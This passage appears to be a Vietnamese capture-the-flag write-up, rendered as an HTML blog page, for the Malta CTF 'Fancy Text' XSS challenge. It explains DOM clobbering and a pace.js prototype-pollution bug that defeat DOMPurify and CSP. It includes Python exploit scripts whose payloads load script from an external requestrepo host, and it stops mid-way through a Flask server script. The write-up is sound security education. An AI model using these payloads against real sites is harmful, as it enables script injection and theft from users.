@@ -1,0 +1,828 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+
+    <title>FANCY TEXT - 3HLD</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="3HLD" />
+    
+
+    
+        <meta property="og:title" content="FANCY TEXT" />
+<meta property="og:description" content="Malta CTF Giải này mình chỉ làm được có một bài thui &hellip;. bài đầu khá dễ nên mình sẽ viết về câu 2.
+Fancy text Bài này là một bài XSS nhưng sử dụng DOMPURIFY latest và CSP để chặn hầu hết mọi đường . Source code đơn giản như sau : index.html
+&lt;head&gt; &lt;title&gt;Fancy Text Generator!&lt;/title&gt; &lt;link href=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script integrity=&quot;sha256-1ltlTOtatSNq5nY&#43;DSYtbldahmQSfsXkeBYmBH5i9dQ=&quot; src=&quot;/loader.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Fancy text generator&lt;/h1&gt; &lt;div id=&quot;contentBox&quot;&gt;&lt;%- text || &quot;fancy text generator!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/writeups/maltactf2025/fancy/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2025-06-23T18:30:32+02:00" />
+<meta property="article:modified_time" content="2025-06-26T13:25:34+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="FANCY TEXT"/>
+<meta name="twitter:description" content="Malta CTF Giải này mình chỉ làm được có một bài thui &hellip;. bài đầu khá dễ nên mình sẽ viết về câu 2.
+Fancy text Bài này là một bài XSS nhưng sử dụng DOMPURIFY latest và CSP để chặn hầu hết mọi đường . Source code đơn giản như sau : index.html
+&lt;head&gt; &lt;title&gt;Fancy Text Generator!&lt;/title&gt; &lt;link href=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script integrity=&quot;sha256-1ltlTOtatSNq5nY&#43;DSYtbldahmQSfsXkeBYmBH5i9dQ=&quot; src=&quot;/loader.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Fancy text generator&lt;/h1&gt; &lt;div id=&quot;contentBox&quot;&gt;&lt;%- text || &quot;fancy text generator!"/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">3HLD</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fancy-text">Fancy text</a></li>
+    <li><a href="#chương-trình-này-làm-gì-">Chương trình này làm gì .</a>
+      <ul>
+        <li><a href="#làm-sao-không-bị-ảnh-hưởng-bởi-hàm-fancy-text">Làm sao không bị ảnh hưởng bởi hàm fancy text.</a></li>
+      </ul>
+    </li>
+    <li><a href="#đọc-write-up">Đọc write up</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">web</div>
+
+  
+    <div class="badge">204 points</div>
+
+  
+    <div class="badge">25 solves</div>
+
+  
+    <div class="badge">downgrade</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Jun 23, 2025
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    
+<h1 id="malta-ctf" class="header-anchor-wrapper">Malta CTF
+  <a href="#malta-ctf" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<blockquote>
+<p>Giải này mình chỉ làm được có một bài thui &hellip;. bài đầu khá dễ nên mình sẽ viết về câu 2.</p>
+</blockquote>
+
+<h2 id="fancy-text" class="header-anchor-wrapper">Fancy text
+  <a href="#fancy-text" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Bài này là một bài XSS nhưng sử dụng DOMPURIFY latest và CSP để chặn hầu hết mọi đường .
+Source code đơn giản như sau :</li>
+</ul>
+<p><em>index.html</em></p>
+<pre  class="mc-prism hide language-text" ><code class="language-html">&lt;head&gt;
+    &lt;title&gt;Fancy Text Generator!&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&quot;/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;script integrity=&quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&quot; src=&quot;/loader.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1&gt;Fancy text generator&lt;/h1&gt;
+    &lt;div id=&quot;contentBox&quot;&gt;&lt;%- text || &quot;fancy text generator!&quot; %&gt;&lt;/div&gt;
+    &lt;/br&gt;
+    &lt;form action=&quot;/&quot; method=&quot;GET&quot;&gt;
+        &lt;input name=&quot;text&quot; placeholder=&quot;text to make fancy&quot;&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+</code></pre>
+<p><em>loader.js</em></p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
+    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
+    &quot;main&quot;: &quot;/main.js&quot;,
+}
+
+function appendScript(src) {
+    let script = document.createElement('script');
+    script.src = src;
+    document.head.appendChild(script);
+};
+
+for (let script in scripts) {
+    appendScript(scripts[script]);
+}
+
+</code></pre>
+<p>main.js</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const toFancyText = (text) =&gt; {
+    const fancyLowerStart = 0x1D51E; // 'a'
+    const fancyUpperMap = {
+        A: 0x1D504, B: 0x1D505, C: 0x212D, D: 0x1D507, E: 0x1D508,
+        F: 0x1D509, G: 0x1D50A, H: 0x210C, I: 0x2111, J: 0x1D50D,
+        K: 0x1D50E, L: 0x1D50F, M: 0x1D510, N: 0x1D511, O: 0x1D512,
+        P: 0x1D513, Q: 0x1D514, R: 0x211C, S: 0x1D516, T: 0x1D517,
+        U: 0x1D518, V: 0x1D519, W: 0x1D51A, X: 0x1D51B, Y: 0x1D51C, Z: 0x2128
+    };
+
+    return [...text].map(char =&gt; {
+        const code = char.charCodeAt(0);
+
+        // a-z
+        if (code &gt;= 97 &amp;&amp; code &lt;= 122) {
+            return String.fromCodePoint(fancyLowerStart + (code - 97));
+        }
+
+        // A-Z
+        if (char in fancyUpperMap) {
+            return String.fromCodePoint(fancyUpperMap[char]);
+        }
+
+        // Leave others (numbers, punctuation) unchanged
+        return char;
+    }).join('');
+}
+
+contentBox.innerText = toFancyText(contentBox.innerText)
+</code></pre>
+<p><em>server.js</em></p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const express = require('express')
+const app = express();
+const createDOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+
+app.set('view engine', 'ejs');
+app.use(express.static('static'))
+
+app.use((req, res, next) =&gt; {
+    res.set('Content-Security-Policy', &quot;script-src 'sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=' 'strict-dynamic'; object-src 'none';&quot;);
+    next();
+});
+
+app.get('/', (req, res) =&gt; {
+    const window = new JSDOM('').window;
+    const DOMPurify = createDOMPurify(window);
+    ///return res.render('index', {text: DOMPurify.sanitize(req.query.text)})
+    return res.render('index', { text: req.query.text })
+})
+
+app.listen(process.env.PORT || 1337, () =&gt; {
+    console.log(`listening on ${process.env.PORT || 1337}`)
+})
+
+</code></pre>
+
+<h2 id="chương-trình-này-làm-gì-" class="header-anchor-wrapper">Chương trình này làm gì .
+  <a href="#ch%c6%b0%c6%a1ng-tr%c3%acnh-n%c3%a0y-l%c3%a0m-g%c3%ac-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ol>
+<li>Cho phép user nhập input vào sau đó input sẽ đi qua hàm main và biến đổi sang các kí tự đặc biệt khác nhau.</li>
+<li>Sử dụng script intergrity để chống việc file loader.js bị thay đổi nên ta có thể loại bỏ việc load một file script khác từ bên ngoài vào.</li>
+<li>Dùng dompurify để loại bỏ hết các tag nguy hiểm.</li>
+</ol>
+<p>Sau đó mình đọc hàm loader.js thì thấy nó có thể load script đến &ldquo;/main.js&rdquo; và &ldquo;pace.js&rdquo; .Sau khi check csp thì mình thấy nó thiếu base uri check .
+<img alt="image" src="https://hackmd.io/_uploads/B1zKFYSNlx.png"></p>
+<ul>
+<li>Nhưng Dompurify vẫn sẽ sanitize nó .</li>
+</ul>
+
+<h3 id="làm-sao-không-bị-ảnh-hưởng-bởi-hàm-fancy-text" class="header-anchor-wrapper">Làm sao không bị ảnh hưởng bởi hàm fancy text.
+  <a href="#l%c3%a0m-sao-kh%c3%b4ng-b%e1%bb%8b-%e1%ba%a3nh-h%c6%b0%e1%bb%9fng-b%e1%bb%9fi-h%c3%a0m-fancy-text" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<ul>
+<li>
+<p>Lúc này mình vẫn không biết làm sao để lấy được xss nên mình nghĩ đến việc làm sao để truyền payload tùy ý vào mà không bị ảnh hưởng bởi fancyText đã.</p>
+</li>
+<li>
+<p>Lúc này mình thấy có bug Dom clobbering ở chỗ</p>
+</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">contentBox.innerText = toFancyText(contentBox.innerText)
+</code></pre>
+<ul>
+<li>Vậy ta có thể chèn bất kì tag nào với id &ldquo;contentBox&rdquo; thì nó sẽ crash cái hàm main này và ta có thể dùng <em><strong>html injection</strong></em></li>
+<li>Nhưng vấn đề lớn nhất vẫn là Dompurify và mình đã bí từ đây..</li>
+<li>Sau đó mình nghĩ đến việc dom cloberring được biến <strong>scripts</strong>
+<img alt="image" src="https://hackmd.io/_uploads/BJd4cKBNxe.png"></li>
+<li>Nhưng sau khi thử thì mình nhận ra Dompurify đã tính đến trường hợp này :vv .
+Mình có thể clober &ldquo;script&rdquo; nhưng &ldquo;scripts&rdquo; thì không . Xem hình bên dưới  ( mình sẽ tìm hiểu vấn đề này sau&hellip;)
+<img alt="image" src="https://hackmd.io/_uploads/Byk_5KS4lg.png">
+<img alt="image" src="https://hackmd.io/_uploads/SyvuqFHEgg.png"></li>
+<li>Nhưng mình nhận ra là cho dù có dom cloberring được thì cũng chẳng có ý nghĩa gì vì javascript scope ở đây.
+Vậy là tới đây mình bí toàn tập &hellip;.</li>
+</ul>
+
+<h2 id="đọc-write-up" class="header-anchor-wrapper">Đọc write up
+  <a href="#%c4%91%e1%bb%8dc-write-up" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Sau khi đọc write up mình đã nhận ra cái ngu của mình.</li>
+<li>Đó là mình đã quên kiểm tra package &ldquo;pace.js&rdquo; được load vào &hellip;. Đáng lẽ ra mình phải kiểm tra mọi input được đi vào app của mình mới đúng. Đến đây thì đọc source của pace.js là được.
+Sau đó thì mình tìm được report này vào năm 2024 , yeah 2024 :)
+<a href="https://github.com/CodeByZach/pace/issues/546">https://github.com/CodeByZach/pace/issues/546</a>
+Một bug khá lớn nhưng có vẻ bên developers không còn maintain nữa.
+Bản chất của bug này cũng là merge prototype thui.</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">extend = function() {
+		var key, out, source, sources, val, _i, _len;
+		out = arguments[0], sources = 2 &lt;= arguments.length ? __slice.call(arguments, 1) : [];
+		for (_i = 0, _len = sources.length; _i &lt; _len; _i++) {
+			source = sources[_i];
+			if (source) {
+				for (key in source) {
+					if (!__hasProp.call(source, key)) continue;
+					val = source[key];
+					if ((out[key] != null) &amp;&amp; typeof out[key] === 'object' &amp;&amp; (val != null) &amp;&amp; typeof val === 'object') {
+						extend(out[key], val);
+					} else {
+						out[key] = val;
+					}
+				}
+			}
+		}
+		return out;
+	};
+</code></pre>
+<p>Và mình sẽ có thể <strong>OBJECT PROTOTYPE</strong> bất kì biến nào chỉ với :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-html=">  &lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;YOU ARE POLLUTED!&quot;}}'&gt;
+</code></pre>
+<ul>
+<li>Đến đây thì ý tưởng của bài write up là Object prototype một biến bất kì có giá trị bằng một script source của attacker . Mục đích chính là pollute biến <strong>script</strong> trong loader.js</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
+    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
+    &quot;main&quot;: &quot;/main.js&quot;,
+}
+
+function appendScript(src) {
+    let script = document.createElement('script');
+    script.src = src;
+    document.head.appendChild(script);
+};
+
+// This will loop through our &quot;polluted&quot; : &quot;//attacker.js&quot;
+for (let script in scripts) {
+    appendScript(scripts[script]);
+}
+</code></pre>
+<ul>
+<li>Đọc đến đây mình thấy khá bất ngờ khi object prototype có thể ảnh hưởng đến cả loop for in ?</li>
+<li>Test thử thì mình thấy quả thật vậy;</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
+    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
+    &quot;main&quot;: &quot;/main.js&quot;,
+}
+
+Object.prototype.polluted = &quot;FUCKED&quot;
+console.log(&quot;Just log it out : &quot;, scripts)
+
+for (let script in scripts) {
+    console.log(&quot;[&quot; + script + &quot;] =&gt; &quot; + scripts[script])
+}
+
+/*OUTPUT : 
+Just log it out :  {
+  pace: 'https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js',
+  main: '/main.js'
+}
+[pace] =&gt; https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js
+[main] =&gt; /main.js
+[polluted] =&gt; FUCKED
+*/
+</code></pre>
+<p>Hmmmm, nhìn rất lạ nhỉ .
+<img alt="image" src="https://hackmd.io/_uploads/rkl90FBVge.png"></p>
+<p>Sau khi đọc docs thì mình thấy for in sẽ loop qua những enumerables của chính nó và cả những enumerables của Object.prototype ~~</p>
+<ul>
+<li>Thông tin chi tiết về thế nào là enumberables chúng ta có thể xem ở đây :
+<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties</a>
+Và các hàm để kiểm tra enumrables hay không :
+<img alt="image" src="https://hackmd.io/_uploads/SJbg1crExx.png">
+Ta có thể thấy hàm in khi này sẽ xem Enumrable + inherited là true và chính vì thế script của mình sẽ bị polluted khi for in qua.</li>
+</ul>
+
+<h1 id="vấn-đề-cuối-cùng" class="header-anchor-wrapper">Vấn đề cuối cùng
+  <a href="#v%e1%ba%a5n-%c4%91%e1%bb%81-cu%e1%bb%91i-c%c3%b9ng" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Đọc write up thì mình thấy có vẻ còn một bug ở trong pace js để có thể chèn html injection nữa :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">    var _custom_class_name = (options.className !== '') ? ' ' + options.className : '';
+                this.el.innerHTML = '&lt;div class=&quot;pace-progress' + _custom_class_name + '&quot;&gt;\n  &lt;div class=&quot;pace-progress-inner&quot;&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;div class=&quot;pace-activity&quot;&gt;&lt;/div&gt;';
+</code></pre>
+<p>Đơn giản là dùng options className ròi inject vào nhưng vì mình đã có free html injection ròi nên làm ngắn thui..</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
+
+
+url =&quot;https://fancy-text-generator-web.shared.challs.mt/&quot;
+url =&quot;http://localhost:1337&quot;
+
+html = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}}'&gt;
+            '''
+text =  html + '&lt;a id =&quot;contentBox&quot;&gt;'
+res = requests.get(url,params={&quot;text&quot;:text})
+print(res.text)
+print(text)
+
+</code></pre>
+<p>Vậy là đã polluted thành công .
+<img alt="image" src="https://hackmd.io/_uploads/BygxI9BNlg.png"></p>
+<ul>
+<li>Đến đây thì vấn đề là mình cần gọi script /loader.js một lần nữa để load vào nhưng mình không thể bypass được DOM purify . Cuối cùng vẫn phải dùng gadget className của pace js thui :vvv . Nó sẽ giúp mình bypass bằng cách mọi payload đều nằm trong một html attribute nên sẽ valid khi đi qua Dompurify.</li>
+<li>Sau một hồi ngồi escape các thứ thì mình có script sau :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
+import urllib.parse
+import html
+
+
+
+url =&quot;http://localhost:1338&quot;
+url =&quot;https://fancy-text-generator-web.shared.challs.mt&quot;
+
+options = &quot;&quot;
+
+#htmls = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}}'&gt;&lt;script&gt;alert()&lt;/script&gt;'''
+
+def html_encode(s):
+    return s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace('&quot;', &quot;&amp;quot;&quot;).replace(&quot;'&quot;, &quot;&amp;#39;&quot;)
+
+payload ='''aaaa\\&quot;&gt;&lt;script integrity=\\&quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\\&quot; src=\\&quot;/test.js?version=1\\&quot;&gt;&lt;/script&gt;'''
+htmls = f'&lt;img id=&quot;data-pace-options&quot; data-pace-options=\'{{&quot;startOnPageLoad&quot;:true,&quot;__proto__&quot;:{{&quot;polluted&quot;:&quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}},&quot;className&quot;: &quot;{payload}&quot;}}\'&gt;'
+text =  htmls + '&lt;a id =&quot;contentBox&quot;&gt;'
+res = requests.get(url,params={&quot;text&quot;:text})
+print(res.text)
+print(payload)
+print(url + &quot;?text=&quot; + urllib.parse.quote(text))
+
+</code></pre>
+<p>Đến đây thì script của mình được load rồi nhưng mà nó không gọi bất kì request nào cả ?
+<img alt="image" src="https://hackmd.io/_uploads/B1yNWjrVlg.png">
+<img alt="image" src="https://hackmd.io/_uploads/BkKVbsSNlg.png">
+Vì sao ????
+Đến đây thì mình mới nhớ là innerHTML không cho phép script chạy :vv . Bypass bằng iframe là xong</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
+import urllib.parse
+import html
+
+
+
+url =&quot;http://localhost:1338&quot;
+url =&quot;https://fancy-text-generator-web.shared.challs.mt&quot;
+
+options = &quot;&quot;
+
+#htmls = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;&quot;}}'&gt;&lt;script&gt;alert()&lt;/img&gt;'''
+
+def html_encode(s):
+    return s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace('&quot;', &quot;&amp;quot;&quot;).replace(&quot;'&quot;, &quot;&amp;#39;&quot;)
+
+payload ='''aaaa\\&quot;&gt;&lt;iframe srcdoc =\\&quot;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;img id=&amp;amp;quot;data-pace-options&amp;amp;quot; data-pace-options=&amp;amp;#39;{&amp;amp;quot;__proto__&amp;amp;quot;: {&amp;amp;quot;polluted&amp;amp;quot;: &amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js&amp;amp;quot;}}&amp;amp;#39;&gt;\\&quot;&gt;'''
+htmls = f'&lt;img id=&quot;data-pace-options&quot; data-pace-options=\'{{&quot;startOnPageLoad&quot;:true,&quot;__proto__&quot;:{{&quot;polluted&quot;:&quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}},&quot;className&quot;: &quot;{payload}&quot;}}\'&gt;'
+text =  htmls + '&lt;a id =&quot;contentBox&quot;&gt;'
+res = requests.get(url,params={&quot;text&quot;:text})
+print(res.text)
+print(payload)
+print(url + &quot;?text=&quot; + urllib.parse.quote(text))
+
+</code></pre>
+<p>Đến đoạn này thì còn một vấn đề là loader.js của mình sẽ luôn được load trước khi pace-js được load . Mình có thể tạo một hanging server và gửi loader.js đúng với file ban đầu để không bị lỗi intergriti</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">from flask import Flask, send_file
+from flask_cors import CORS
+
+import time 
+
+app = Flask(__name__)
+CORS(app)  # Enable CORS for all routes
+
